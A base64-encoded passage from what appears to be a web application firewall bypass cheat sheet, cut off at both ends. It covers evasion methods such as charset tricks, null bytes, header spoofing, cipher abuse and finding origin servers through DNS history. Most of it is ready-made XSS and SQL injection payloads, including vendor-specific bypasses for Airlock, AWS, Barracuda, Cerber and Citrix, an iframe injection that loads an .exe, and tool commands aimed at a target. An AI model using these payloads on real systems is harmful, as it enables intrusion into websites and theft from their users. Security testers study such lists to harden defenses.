CiMjIyMgQ2hhcnNldCBCdWdzOgotIFdlIGNhbiB0cnkgY2hhbmdpbmcgY2hh
cnNldCBoZWFkZXIgdG8gaGlnaGVyIFVuaWNvZGUgKGVnLiBVVEYtMzIpIGFu
ZCB0ZXN0IHBheWxvYWRzLgotIFdoZW4gdGhlIHNpdGUgZGVjb2RlcyB0aGUg
c3RyaW5nLCB0aGUgcGF5bG9hZCBnZXRzIHRyaWdnZXJlZC4KCkV4YW1wbGUg
cmVxdWVzdDoKPHByZT4KR0VUIDxiPi9wYWdlLnBocD9wPeKIgOO4gOOwgHNj
cmlwdOO4gGFsZXJ0KDEp47CAL3NjcmlwdOO4gDwvYj4gSFRUUC8xLjEKSG9z
dDogc2l0ZS5jb20KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9z
aDsgSW50ZWwgTWFjIE9TIFggMTAuOTsgcnY6MzIuMCkgR2Vja28vMjAxMDAx
MDEgRmlyZWZveC8zMi4wCjxiPkFjY2VwdC1DaGFyc2V0OnV0Zi0zMjsgcT0w
LjU8L2I+CkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUKQWNjZXB0
LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlCjwvcHJlPgpXaGVuIHRoZSBzaXRl
IGxvYWRzLCBpdCB3aWxsIGJlIGVuY29kZWQgdG8gdGhlIFVURi0zMiBlbmNv
ZGluZyB0aGF0IHdlIHNldCwgYW5kCnRoZW4gYXMgdGhlIG91dHB1dCBlbmNv
ZGluZyBvZiB0aGUgcGFnZSBpcyBVVEYtOCwgaXQgd2lsbCBiZSByZW5kZXJl
ZCBhczogYCI8c2NyaXB0PmFsZXJ0ICgxKSA8LyBzY3JpcHQ+YCB3aGljaCB3
aWxsIHRyaWdnZXIgWFNTLgoKRmluYWwgVVJMIGVuY29kZWQgcGF5bG9hZDoK
YGBgCiVFMiU4OCU4MCVFMyVCOCU4MCVFMyVCMCU4MHNjcmlwdCVFMyVCOCU4
MGFsZXJ0KDEpJUUzJUIwJTgwL3NjcmlwdCVFMyVCOCU4MCAKYGBgCgojIyMj
IE51bGwgQnl0ZXM6Ci0gVGhlIG51bGwgYnl0ZXMgYXJlIGNvbW1vbmx5IHVz
ZWQgYXMgc3RyaW5nIHRlcm1pbmF0b3IuCi0gVGhpcyBjYW4gaGVscCB1cyBl
dmFkZSBtYW55IHdlYiBhcHBsaWNhdGlvbiBmaWx0ZXJzIGluIGNhc2UgdGhl
eSBhcmUgbm90IGZpbHRlcmluZyBvdXQgdGhlIG51bGwgYnl0ZXMuCgpQYXls
b2FkIGV4YW1wbGVzOgpgYGAKPHNjcmklMDBwdD5hbGVydCgxKTs8L3Njcmkl
MDBwdD4KPHNjcmlceDAwcHQ+YWxlcnQoMSk7PC9zY3JpJTAwcHQ+CjxzJTAw
YyUwMHIlMDAlMDBpcCUwMHQ+Y29uZmlybSgwKTs8L3MlMDBjJTAwciUwMCUw
MGlwJTAwdD4KYGBgCl9fU3RhbmRhcmRfXzogYDxhIGhyZWY9ImphdmFzY3Jp
cHQ6YWxlcnQoKSI+YCAgCl9fT2JmdXNjYXRlZF9fOiBgPGEgaHJlZj0iamEw
eDA5dmFzMHgwQTB4MERjcmlwdDphbGVydCgxKSI+Y2xpY2ttZTwvYT5gICAK
X19WYXJpYW50X186IGA8YSAweDAwIGhyZWY9ImphdmFzY3JpcHQ6YWxlcnQo
MSkiPmNsaWNrbWU8L2E+YAoKIyMjIyBQYXJzaW5nIEJ1Z3M6Ci0gUkZDIHN0
YXRlcyB0aGF0IE5vZGVOYW1lcyBjYW5ub3QgYmVnaW4gd2l0aCB3aGl0ZXNw
YWNlLgotIEJ1dCB3ZSBjYW4gdXNlIHNwZWNpYWwgY2hhcnMgbGlrZSBgICVg
LCBgLy9gLCBgIWAsIGA/YCwgZXRjLgoKRXhhbXBsZXM6Ci0gYDwvLyBzdHls
ZT14OmV4cHJlc3Npb25cMjh3cml0ZSgxKVwyOT5gICAtIFdvcmtzIHVwdG8g
SUU3IF8oW1NvdXJjZV0oaHR0cDovL2h0bWw1c2VjLm9yZy8jNzEpKV8KLSBg
PCEtLVtpZl0+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0IC0tPmAgLSBXb3Jr
cyB1cHRvIElFOSBfKFtSZWZlcmVuY2VdKGh0dHA6Ly9odG1sNXNlYy5vcmcv
IzExNSkpXwotIGA8P3htbC1zdHlsZXNoZWV0IHR5cGU9InRleHQvY3NzIj8+
PHJvb3Qgc3R5bGU9Ing6ZXhwcmVzc2lvbih3cml0ZSgxKSkiLz5gIC0gV29y
a3MgaW4gSUU3IF8oW1JlZmVyZW5jZV0oaHR0cDovL2h0bWw1c2VjLm9yZy8j
NzcpKV8KLSBgPCVkaXYlMjBzdHlsZT14c3M6ZXhwcmVzc2lvbihwcm9tcHQo
MSkpPmAgLSBXb3JrcyBVcHRvIElFNwoKIyMjIyBVbmljb2RlIFNlcGFyYXRv
cnM6Ci0gRXZlcnkgYnJvd3NlciBoYXMgdGhlaXIgb3duIHNwZWNpZmljIGNo
YXJzZXQgb2Ygc2VwYXJhdG9ycy4KLSBXZSBjYW4gZnV6eiBjaGFyc2V0IHJh
bmdlIG9mIGAweDAwYCB0byBgMHhGRmAgYW5kIGdldCB0aGUgc2V0IG9mIHNl
cGFyYXRvcnMgZm9yIGVhY2ggYnJvd3Nlci4KLSBXZSBjYW4gdXNlIHRoZXNl
IHNlcGFyYXRvcnMgaW4gcGxhY2VzIHdoZXJlIGEgc3BhY2UgaXMgcmVxdWly
ZWQuCgpIZXJlIGlzIGEgY29tcGlsZWQgbGlzdCBvZiBzZXBhcmF0b3JzIGJ5
IFtATWFzYXRvIEtpbnVnYXdhXShodHRwczovL2dpdGh1Yi5jb20vbWFzYXRv
a2ludWdhd2EpOgotIElFeHBsb3JlcjogYDB4MDlgLCBgMHgwQmAsIGAweDBD
YCwgYDB4MjBgLCBgMHgzQmAgIAotIENocm9tZTogYDB4MDlgLCBgMHgyMGAs
IGAweDI4YCwgYDB4MkNgLCBgMHgzQmAgIAotIFNhZmFyaTogYDB4MkNgLCBg
MHgzQmAgIAotIEZpcmVGb3g6IGAweDA5YCwgYDB4MjBgLCBgMHgyOGAsIGAw
eDJDYCwgYDB4M0JgICAKLSBPcGVyYTogYDB4MDlgLCBgMHgyMGAsIGAweDJD
YCwgYDB4M0JgICAKLSBBbmRyb2lkOiBgMHgwOWAsIGAweDIwYCwgYDB4Mjhg
LCBgMHgyQ2AsIGAweDNCYCAKCkFuIGV4b3RpYyBwYXlsb2FkIGV4YW1wbGU6
IApgYGAKPGEvb25tb3VzZW92ZXJbXHgwYl09bG9jYXRpb249J1x4NkFceDYx
XHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzRceDNBXHg2MVx4NkNc
eDY1XHg3Mlx4NzRceDI4XHgzMFx4MjlceDNCJz5wd24zZApgYGAKCiMjIyBV
c2luZyBBdHlwaWNhbCBFcXVpdmFsZW50IFN5bnRhY3RpYyBTdHJ1Y3R1cmVz
Ci0gVGhpcyBtZXRob2QgYWltcyBhdCBmaW5kaW5nIGEgd2F5IG9mIGV4cGxv
aXRhdGlvbiBub3QgY29uc2lkZXJlZCBieSB0aGUgV0FGIGRldmVsb3BlcnMu
Ci0gU29tZSB1c2UgY2FzZXMgY2FuIGJlIHR3aXRjaGVkIHRvIGNyaXRpY2Fs
IGxldmVscyB3aGVyZSB0aGUgV0FGIGNhbm5vdCBkZXRlY3QgdGhlIHBheWxv
YWRzIGF0IGFsbC4KLSBUaGlzIHBheWxvYWQgaXMgYWNjZXB0ZWQgYW5kIGV4
ZWN1dGVkIGJ5IHRoZSBzZXJ2ZXIgYWZ0ZXIgZ29pbmcgdGhyb3VnaCB0aGUg
ZmlyZXdhbGwuCgpTb21lIGNvbW1vbiBrZXl3b3JkcyBvdmVybG9va2VkIGJ5
IFdBRiBkZXZlbG9wZXJzOgotIEphdmFTY3JpcHQgZnVuY3Rpb25zOgogICAg
LSBgd2luZG93YAogICAgLSBgcGFyZW50YAogICAgLSBgdGhpc2AKICAgIC0g
YHNlbGZgCi0gVGFnIGF0dHJpYnV0ZXM6CiAgICAtIGBvbndoZWVsYAogICAg
LSBgb250b2dnbGVgCiAgICAtIGBvbmZpbHRlcmNoYW5nZWAKICAgIC0gYG9u
YmVmb3Jlc2NyaXB0ZXhlY3V0ZWAKICAgIC0gYG9uZHJhZ3N0YXJ0YAogICAg
LSBgb25hdXhjbGlja2AKICAgIC0gYG9ucG9pbnRlcm92ZXJgCiAgICAtIGBz
cmNkb2NgCi0gU1FMIE9wZXJhdG9ycwogICAgLSBgbHBhZGAKICAgIC0gYGZp
ZWxkYAogICAgLSBgYml0X2NvdW50YAoKRXhhbXBsZSBQYXlsb2FkczogIAot
IF9fQ2FzZTpfXyBYU1MKYGBgCjxzY3JpcHQ+d2luZG93WydhbGVydCddKDAp
PC9zY3JpcHQ+CjxzY3JpcHQ+cGFyZW50WydhbGVydCddKDEpPC9zY3JpcHQ+
CjxzY3JpcHQ+c2VsZlsnYWxlcnQnXSgyKTwvc2NyaXB0PgpgYGAKLSBfX0Nh
c2U6X18gU1FMaQpgYGAKU0VMRUNUIGlmKExQQUQoJyAnLDQsdmVyc2lvbigp
KT0nNS43JyxzbGVlcCg1KSxudWxsKTsKMSUwYnx8JTBiTFBBRChVU0VSLDcs
MSkKYGBgCk1hbnkgYWx0ZXJuYXRpdmVzIHRvIHRoZSBvcmlnaW5hbCBKYXZh
U2NyaXB0IGNhbiBiZSB1c2VkLCBuYW1lbHk6Ci0gW0pTRnVja10oaHR0cDov
L3d3dy5qc2Z1Y2suY29tLykKLSBbSkpFbmNvZGVdKGh0dHA6Ly91dGYtOC5q
cC9wdWJsaWMvamplbmNvZGUuaHRtbCkKLSBbWENoYXJzLkpTXShodHRwczov
L3N5bGxhYi5mci9wcm9qZXRzL2V4cGVyaW1lbnRzL3hjaGFyc2pzLzVjaGFy
cy5waXBlbGluZS5odG1sKQo+IEhvd2V2ZXIgdGhlIHByb2JsZW0gaW4gdXNp
bmcgdGhlIGFib3ZlIHN5bnRhY3RpY2FsIHN0cnVjdHVyZXMgaXMgdGhlIGxv
bmcgcGF5bG9hZHMgd2hpY2ggbWlnaHQgcG9zc2libHkgYmUgZGV0ZWN0ZWQg
YnkgdGhlIFdBRiBvciBtYXkgYmUgYmxvY2tlZCBieSB0aGUgQ1NQLiBIb3dl
dmVyLCB5b3UgbmV2ZXIga25vdywgdGhleSBtaWdodCBieXBhc3MgdGhlIENT
UCAoaWYgcHJlc2VudCkgdG9vLiA7KQoKIyMjIEFidXNpbmcgU1NML1RMUyBD
aXBoZXJzOgotIE1hbnkgYSB0aW1lcywgc2VydmVycyBkbyBhY2NlcHQgY29u
bmVjdGlvbnMgZnJvbSB2YXJpb3VzIFNTTC9UTFMgY2lwaGVycyBhbmQgdmVy
c2lvbnMuCi0gVXNpbmcgYSBjaXBoZXIgdG8gaW5pdGlhbGlzZSBhIGNvbm5l
Y3Rpb24gdG8gc2VydmVyIHdoaWNoIGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhl
IFdBRiBjYW4gZG8gb3VyIHdvcmtsb2FkLgoKIyMjIyBUZWNobmlxdWU6Ci0g
RGlnIG91dCB0aGUgY2lwaGVycyBzdXBwb3J0ZWQgYnkgdGhlIGZpcmV3YWxs
ICh1c3VhbGx5IHRoZSBXQUYgdmVuZG9yIGRvY3VtZW50YXRpb24gZGlzY3Vz
c2VzIHRoaXMpLgotIEZpbmQgb3V0IHRoZSBjaXBoZXJzIHN1cHBvcnRlZCBi
eSB0aGUgc2VydmVyICh0b29scyBsaWtlIFtTU0xTY2FuXShodHRwczovL2dp
dGh1Yi5jb20vcmJzZWMvc3Nsc2NhbikgaGVscHMgaGVyZSkuCi0gSWYgYSBz
cGVjaWZpYyBjaXBoZXIgbm90IHN1cHBvcnRlZCBieSBXQUYgYnV0IGJ5IHRo
ZSBzZXJ2ZXIsIGlzIGZvdW5kLCB2b2lsYSEKLSBJbml0aWF0aW5nIGEgbmV3
IGNvbm5lY3Rpb24gdG8gdGhlIHNlcnZlciB3aXRoIHRoYXQgc3BlY2lmaWMg
Y2lwaGVyIHNob3VsZCBzbXVnZ2xlIG91ciBwYXlsb2FkIGluLgoKPiBfX1Rv
b2xfXzogW2FidXNlLXNzbC1ieXBhc3Mtd2FmXShodHRwczovL2dpdGh1Yi5j
b20vTGFuZEdyZXkvYWJ1c2Utc3NsLWJ5cGFzcy13YWYpICAKYGBgCnB5dGhv
biBhYnVzZS1zc2wtYnlwYXNzLXdhZi5weSAtdGhyZWFkIDQgLXRhcmdldCA8
dGFyZ2V0PgpgYGAKQ0xJIHRvb2xzIGxpa2UgY1VSTCBjYW4gY29tZSB2ZXJ5
IGhhbmR5IGZvciBQb0NzOgpgYGAKY3VybCAtLWNpcGhlcnMgPGNpcGhlcj4g
LUcgPHRlc3Qgc2l0ZT4gLWQgPHBheWxvYWQgd2l0aCBwYXJhbWV0ZXI+CmBg
YAoKIyMjIEFidXNpbmcgRE5TIEhpc3Rvcnk6Ci0gT2Z0ZW4gb2xkIGhpc3Rv
cmljYWwgRE5TIHJlY29yZHMgcHJvdmlkZSBpbmZvcm1hdGlvbiBhYm91dCB0
aGUgbG9jYXRpb24gb2YgdGhlIHNpdGUgYmVoaW5kIHRoZSBXQUYuCi0gVGhl
IHRhcmdldCBpcyB0byBnZXQgdGhlIGxvY2F0aW9uIG9mIHRoZSBzaXRlLCBz
byB0aGF0IHdlIGNhbiByb3V0ZSBvdXIgcmVxdWVzdHMgZGlyZWN0bHkgdG8g
dGhlIHNpdGUgYW5kIG5vdCB0aHJvdWdoIHRoZSBXQUYuCj4gX19USVA6X18g
U29tZSBvbmxpbmUgc2VydmljZXMgbGlrZSBbSVAgSGlzdG9yeV0oaHR0cDov
L3d3dy5pcGhpc3RvcnkuY2gvZW4vKSBhbmQgW0ROUyBUcmFpbHNdKGh0dHBz
Oi8vc2VjdXJpdHl0cmFpbHMuY29tL2Rucy10cmFpbHMpIGNvbWUgdG8gdGhl
IHJlc2N1ZSBkdXJpbmcgdGhlIHJlY29uIHByb2Nlc3MuICAKCl9fVG9vbF9f
OiBbYnlwYXNzLWZpcmV3YWxscy1ieS1ETlMtaGlzdG9yeV0oaHR0cHM6Ly9n
aXRodWIuY29tL3ZpbmNlbnRjb3gvYnlwYXNzLWZpcmV3YWxscy1ieS1ETlMt
aGlzdG9yeSkKYGBgCmJhc2ggYnlwYXNzLWZpcmV3YWxscy1ieS1ETlMtaGlz
dG9yeS5zaCAtZCA8dGFyZ2V0PiAtLWNoZWNrYWxsCmBgYAoKIyMjIFVzaW5n
IFdoaXRlbGlzdCBTdHJpbmdzOgojIyMjIE1ldGhvZDoKLSBTb21lIFdBRiBk
ZXZlbG9wZXJzIGtlZXAgYSBzaGFyZWQgc2VjcmV0IHdpdGggdGhlaXIgdXNl
cnMvZGV2cyB3aGljaCBhbGxvd3MgdGhlbSB0byBwYXNzIGhhcm1mdWwgcXVl
cmllcyB0aHJvdWdoIHRoZSBXQUYuCi0gVGhpcyBzaGFyZWQgc2VjcmV0LCBp
ZiBsZWFrZWQva25vd24sIGNhbiBiZSB1c2VkIHRvIGJ5cGFzcyBhbGwgcHJv
dGVjdGlvbnMgd2l0aGluIHRoZSBXQUYuCgojIyMjIFRlY2huaXF1ZToKLSBV
c2luZyB0aGUgd2hpdGVsaXN0IHN0cmluZyBhcyBhIHBhcmFtdGVyIGluIEdF
VC9QT1NUL1BVVC9ERUxFVEUgcmVxdWVzdHMgc211Z2dsZXMgb3VyIHBheWxv
YWQgdGhyb3VnaCB0aGUgV0FGLgotIFVzdWFsbHkgc29tZSBgKi1zeW5jLXJl
cXVlc3RgIGtleXdvcmRzIG9yIGEgc2hhcmVkIHRva2VuIHZhbHVlIGlzIHVz
ZWQgYXMgdGhlIHNlY3JldC4KCk5vdyB3aGVuIG1ha2luZyBhIHJlcXVlc3Qg
dG8gdGhlIHNlcnZlciwgeW91IGNhbiBhcHBlbmQgaXQgYXMgYSBwYXJhbWV0
ZXI6CmBgYApodHRwOi8vaG9zdC5jb20vP3JhbmRvbXBhcmFtZXRlcj08bWFs
aWNpb3VzLXBheWxvYWQ+JjxzaGFyZWQtc2VjcmV0Pj1UcnVlCmBgYAo+IEEg
cmVhbCBsaWZlIGV4YW1wbGUgaG93IHRoaXMgd29ya3MgY2FuIGJlIGZvdW5k
IGF0IFt0aGlzIGJsb2ddKGh0dHBzOi8vb3NhbmRhbWFsaXRoLmNvbS8yMDE5
LzEwLzEyL2J5cGFzc2luZy10aGUtd2ViYXJ4LXdlYi1hcHBsaWNhdGlvbi1m
aXJld2FsbC13YWYvKS4KCiMjIyBSZXF1ZXN0IEhlYWRlciBTcG9vZmluZzoK
IyMjIyBNZXRob2Q6Ci0gVGhlIHRhcmdldCBpcyB0byBmb29sIHRoZSBXQUYv
c2VydmVyIGludG8gYmVsaWV2aW5nIGl0IHdhcyBmcm9tIHRoZWlyIGludGVy
bmFsIG5ldHdvcmsuCi0gQWRkaW5nIHNvbWUgc3Bvb2ZlZCBoZWFkZXJzIHRv
IHJlcHJlc2VudCB0aGUgaW50ZXJuYWwgbmV0d29yaywgZG9lcyB0aGUgdHJp
Y2suCgojIyMjIFRlY2huaXF1ZToKLSBXaXRoIGVhY2ggcmVxdWVzdCBzb21l
IHNldCBvZiBoZWFkZXJzIGFyZSB0byBiZSBhZGRlZCBzaW11bHRhbmVvdXNs
eSB0aHVzIHNwb29maW5nIHRoZSBvcmlnaW4uCi0gVGhlIHVwc3RyZWFtIHBy
b3h5L1dBRiBtaXNpbnRlcnByZXRzIHRoZSByZXF1ZXN0IHdhcyBmcm9tIHRo
ZWlyIGludGVybmFsIG5ldHdvcmssIGFuZCBsZXRzIG91ciBnb3J5IHBheWxv
YWQgdGhyb3VnaC4KClNvbWUgY29tbW9uIGhlYWRlcnMgdXNlZDoKYGBgClgt
T3JpZ2luYXRpbmctSVA6IDEyNy4wLjAuMQpYLUZvcndhcmRlZC1Gb3I6IDEy
Ny4wLjAuMQpYLVJlbW90ZS1JUDogMTI3LjAuMC4xClgtUmVtb3RlLUFkZHI6
IDEyNy4wLjAuMQpYLUNsaWVudC1JUDogMTI3LjAuMC4xCmBgYAoKIyMjIEdv
b2dsZSBEb3JrcyBBcHByb2FjaDoKIyMjIyBNZXRob2Q6Ci0gVGhlcmUgYXJl
IGEgbG90IG9mIGtub3duIGJ5cGFzc2VzIG9mIHZhcmlvdXMgd2ViIGFwcGxp
Y2F0aW9uIGZpcmV3YWxscyAoW3NlZSBzZWN0aW9uXSgja25vd24tYnlwYXNz
ZXMpKS4KLSBXaXRoIHRoZSBoZWxwIG9mIGdvb2dsZSBkb3Jrcywgd2UgY2Fu
IGVhc2lseSBmaW5kIGJ5cGFzc2VzLgoKIyMjIyBUZWNobmlxdWVzOiAgCkJl
Zm9yZSBhbnl0aGluZyBlbHNlLCB5b3Ugc2hvdWxkIGhvbmUgdXAgc2tpbGxz
IGZyb20gW0dvb2dsZSBEb3JrcyBDaGVhdCBTaGVldF0oaHR0cDovL3BkZi50
ZXh0ZmlsZXMuY29tL3NlY3VyaXR5L2dvb2dsZWhhY2tlcnMucGRmKS4KLSBO
b3JtYWwgc2VhcmNoOiAgCmArPHdhZm5hbWU+IHdhZiBieXBhc3NgCgotIFNl
YXJjaGluZyBmb3Igc3BlY2lmaWMgdmVyc2lvbiBleHBsb2l0czogIApgIjx3
YWZuYW1lPiA8dmVyc2lvbj4iIChieXBhc3N8ZXhwbG9pdClgCgotIEZvciBz
cGVjaWZpYyB0eXBlIGJ5cGFzcyBleHBsb2l0czogIApgIjx3YWZuYW1lPiIg
KzxieXBhc3MgdHlwZT4gKGJ5cGFzc3xleHBsb2l0KWAKCi0gT24gW0V4cGxv
aXQgREJdKGh0dHBzOi8vZXhwbG9pdC1kYi5jb20pOiAgCmBzaXRlOmV4cGxv
aXQtZGIuY29tICs8d2FmbmFtZT4gYnlwYXNzYAoKLSBPbiBbMERheSBJbmpl
Y3QwciBEQl0oaHR0cHM6Ly8wZGF5LnRvZGF5KTogIApgc2l0ZTowZGF5LnRv
ZGF5ICs8d2FmbmFtZT4gPHR5cGU+IChieXBhc3N8ZXhwbG9pdClgCgotIE9u
IFtUd2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKTogIApgc2l0ZTp0d2l0
dGVyLmNvbSArPHdhZm5hbWU+IGJ5cGFzc2AKCi0gT24gW1Bhc3RlYmluXSho
dHRwczovL3Bhc3RlYmluLmNvbSkgIApgc2l0ZTpwYXN0ZWJpbi5jb20gKzx3
YWZuYW1lPiBieXBhc3NgCgojIyBLbm93biBCeXBhc3NlczoKIyMjIEFpcmxv
Y2sgRXJnb24KLSBTUUxpIE92ZXJsb25nIFVURi04IFNlcXVlbmNlIEJ5cGFz
cyAoPj0gdjQuMi40KSBieSBbQFNlYyBDb25zdWx0XShodHRwczovL3d3dy5l
eHBsb2l0LWRiLmNvbS8/YXV0aG9yPTE2MTQpCmBgYAolQzAlODAnK3VuaW9u
K3NlbGVjdCtjb2wxLGNvbDIsY29sMytmcm9tK3RhYmxlKy0tKwpgYGAKCiMj
IyBBV1MKLSBbU1FMaSBCeXBhc3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9lbmth
c2thbC9hd3Mtd2FmLXNxbGktYnlwYXNzLVBvQykgYnkgW0Blbmthc2thbF0o
aHR0cHM6Ly90d2l0dGVyLmNvbS9lbmthc2thbCkKYGBgCiI7IHNlbGVjdCAq
IGZyb20gVEFSR0VUX1RBQkxFIC0tCmBgYAotIFtYU1MgQnlwYXNzXShodHRw
czovL2dpdGh1Yi5jb20va21rei9QZW50ZXN0aW5nL2Jsb2IvbWFzdGVyL1Bl
bnRlc3QtQ2hlYXQtU2hlZXQjTDI4NSkgYnkgW0BrbWt6XShodHRwczovL3R3
aXR0ZXIuY29tL2tta3pfc2VjdXJpdHkpCmBgYAo8c2NyaXB0PmV2YWwoYXRv
YihkZWNvZGVVUklDb21wb25lbnQoInBheWxvYWQiKSkpLy8KYGBgCgojIyMg
QmFycmFjdWRhIAotIENyb3NzIFNpdGUgU2NyaXB0aW5nIGJ5IFtAV0FGTmlu
amFdKGh0dHBzOi8vd2FmLm5pbmphKQpgYGAKPGJvZHkgc3R5bGU9ImhlaWdo
dDoxMDAwcHgiIG9ud2hlZWw9ImFsZXJ0KDEpIj4KPGRpdiBjb250ZXh0bWVu
dT0ieHNzIj5SaWdodC1DbGljayBIZXJlPG1lbnUgaWQ9InhzcyIgb25zaG93
PSJhbGVydCgxKSI+CjxiLyUyNSUzMiUzNSUyNSUzMyUzNiUyNSUzNiUzNiUy
NSUzMiUzNSUyNSUzMyUzNiUyNSUzNiUzNW1vdXNlb3Zlcj1hbGVydCgxKT4K
YGBgCi0gSFRNTCBJbmplY3Rpb24gYnkgW0BHbG9iYWwtRXZvbHV0aW9uXSho
dHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS8/YXV0aG9yPTIwMTYpCmBgYApH
RVQgL2NnaS1tb2QvaW5kZXguY2dpPyZwcmltYXJ5X3RhYj1BRFZBTkNFRCZz
ZWNvbmRhcnlfdGFiPXRlc3RfYmFja3VwX3NlcnZlciZjb250ZW50X29ubHk9
MSYmJmJhY2t1cF9wb3J0PTIxJiZiYWNrdXBfdXNlcm5hbWU9JTNFJTIyJTND
aWZyYW1lJTIwc3JjJTNEaHR0cCUzQS8vd3d3LmV4YW1wbGUubmV0L2V0Yy9i
YWQtZXhhbXBsZS5leGUlM0UmJmJhY2t1cF90eXBlPWZ0cCYmYmFja3VwX2xp
ZmU9NSYmYmFja3VwX3NlcnZlcj0lM0UlMjIlM0NpZnJhbWUlMjBzcmMlM0Ro
dHRwJTNBLy93d3cuZXhhbXBsZS5uZXQvZXRjL2JhZC1leGFtcGxlLmV4ZSUz
RSYmYmFja3VwX3BhdGg9JTNFJTIyJTNDaWZyYW1lJTIwc3JjJTNEaHR0cCUz
QS8vd3d3LmV4YW1wbGUubmV0L2V0Yy9iYWQtZXhhbXBsZS5leGUlM0UmJmJh
Y2t1cF9wYXNzd29yZD0lM0UlMjIlM0NpZnJhbWUlMjBzcmMlM0RodHRwJTNB
Ly93d3cuZXhhbXBsZS5uZXQlMjB3aWR0aCUzRDgwMCUyMGhlaWdodCUzRDgw
MCUzRSYmdXNlcj1ndWVzdCYmcGFzc3dvcmQ9MTIxYzM0ZDRlODVkZmU2NzU4
ZjMxY2UyZDdiNzYzZTcmJmV0PTEyNjEyMTc3OTImJmxvY2FsZT1lbl9VUwpI
b3N0OiBmYXZvcml0ZXdhZi5jb20KVXNlci1BZ2VudDogTW96aWxsYS81LjAg
KGNvbXBhdGlibGU7IE1TSUU1LjAxOyBXaW5kb3dzIE5UKQpgYGAKLSBYU1Mg
QnlwYXNzIGJ5IFtAMHhJbmZlY3Rpb25dKGh0dHBzOi8vdHdpdHRlci5jb20v
MHhJbmZlY3Rpb24pCmBgYAo8YSBocmVmPWolMEFhJTBBdiUwQWElMEFzJTBB
YyUwQXIlMEFpJTBBcCUwQXQ6b3BlbigpPmNsaWNraGVyZQpgYGAKLSBbQmFy
cmFjdWRhIFdBRiA4LjAuMSAtIFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbiAo
TWV0YXNwbG9pdCldKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxv
aXRzLzQwMTQ2KSBieSBbQHhvcnRdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIu
Y29tLz9hdXRob3I9NDc5IykKLSBbQmFycmFjdWRhIFNwYW0gJiBWaXJ1cyBG
aXJld2FsbCA1LjEuMyAtIFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbiAoTWV0
YXNwbG9pdCldKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRz
LzQwMTQ3KSBieSBbQHhvcnRdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29t
Lz9hdXRob3I9NDc5KQoKIyMjIENlcmJlciAoV29yZFByZXNzKQotIFVzZXJu
YW1lIEVudW1lcmF0aW9uIFByb3RlY3Rpb24gQnlwYXNzIGJ5IEhUVFAgVmVy
YiBUYW1wZXJpbmcgYnkgW0BlZDB4MjFzb25dKGh0dHBzOi8vd3d3LmV4cGxv
aXQtZGIuY29tLz9hdXRob3I9OTkwMSkKYGBgClBPU1QgaG9zdC5jb20gSFRU
UC8xLjEKSG9zdDogZmF2b3JpdGV3YWYuY29tClVzZXItQWdlbnQ6IE1vemls
bGEvNS4wIChjb21wYXRpYmxlOyBNU0lFNS4wMTsgV2luZG93cyBOVCkKCmF1
dGhvcj0xCmBgYAotIFByb3RlY3RlZCBBZG1pbiBTY3JpcHRzIEJ5cGFzcyBi
eSBbQGVkMHgyMXNvbl0oaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vP2F1
dGhvcj05OTAxKQpgYGAKaHR0cDovL2hvc3Qvd3AtYWRtaW4vLy9sb2FkLXNj
cmlwdHMucGhwP2xvYWQlNUIlNUQ9anF1ZXJ5LWNvcmUsanF1ZXJ5LW1pZ3Jh
dGUsdXRpbHMKaHR0cDovL2hvc3Qvd3AtYWRtaW4vLy9sb2FkLXN0eWxlcy5w
aHA/bG9hZCU1QiU1RD1kYXNoaWNvbnMsYWRtaW4tYmFyCmBgYAotIFJFU1Qg
QVBJIERpc2FibGUgQnlwYXNzIGJ5IFtAZWQweDIxc29uXShodHRwczovL3d3
dy5leHBsb2l0LWRiLmNvbS8/YXV0aG9yPTk5MDEpCmBgYApodHRwOi8vaG9z
dC9pbmRleC5waHAvd3AtanNvbi93cC92Mi91c2Vycy8KYGBgCgojIyMgQ2l0
cml4IE5ldFNjYWxlcgotIFNRTGkgdmlhIEhUVFAgUGFyYW1ldGVyIFBvbGx1
dGlvbiAoTlMxMC41KSBieSBbQEJHQSBTZWN1cml0eV0oaHR0cHM6Ly93d3cu
ZXhwbG9pdC1kYi5jb20vP2F1dGhvcj03Mzk2KQpgYGAKPHNvYXBlbnY6RW52
ZWxvcGUgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5v
cmcvc29hcC9lbnZlbG9wZS8iIHhtbG5zOnRlbT0iaHR0cDovL3RlbXB1cmku
b3JnLyI+CiAgIDxzb2FwZW52OkhlYWRlci8+CiAgIDxzb2FwZW52OkJvZHk+
CiAgICAgICAgPHN0cmluZz7igJkgdW5pb24gc2VsZWN0IGN1cnJlbnRfdXNl
ciwgMiM8L3N0cmluZz4KICAgIDwvc29hcGVudjpCb2R5Pgo8L3NvYXBlbnY6
RW52ZWxvcGU+CmBgYAoKLSBbYGdlbmVyaWNfYXBpX2NhbGwucGxgIFhTU10o
aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzA3NzcpIGJ5
IFtATk5Qb3N0ZXJdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tLz9hdXRo
b3I9NjY1NCkKYGBgCmh0dHA6Ly9ob3N0L3dzL2dlbmVyaWNfYXBpX2NhbGwu
cGw/ZnVuY3Rpb249c3RhdG5zJnN0YW5kYWxvbmU9JTNjL3NjcmlwdCUzZSUz
Y3NjcmlwdCUzZWFsZXJ0KGRvY3VtZW50LmNvb2tpZSklM2Mvc2NyaXB0JTNl
JTNjc2NyaXB0JTNlCmBgYCAKCiMjIyBDbG91ZGZsYXJlCi0gW1hTUyBCeXBh
